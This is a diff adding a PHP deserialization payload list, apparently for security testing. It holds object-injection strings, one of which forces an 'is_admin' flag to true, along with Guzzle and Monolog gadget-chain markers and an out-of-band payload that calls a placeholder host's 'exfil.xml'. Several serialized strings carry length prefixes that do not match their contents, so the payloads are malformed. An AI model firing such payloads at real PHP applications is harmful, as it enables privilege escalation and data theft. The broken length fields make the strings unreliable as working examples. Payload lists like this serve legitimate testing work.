@@ -1,0 +1,12 @@
+# PHP Deserialization Payloads
+
+# Basic Object Injection
+O:8:"stdClass":0:{}
+O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"is_admin";b:1;}
+
+# Generic Gadget Chain Markers (Replace with actual chains like Guzzle/Monolog)
+O:16:"GuzzleHttp\Cookie\SetCookie":0:{}
+O:24:"Monolog\Handler\SyslogHandler":0:{}
+
+# OOB / Blind Detection
+O:20:"SimpleXMLElement":1:{s:4:"data";s:31:"http://YOUR_HOST/exfil.xml";}
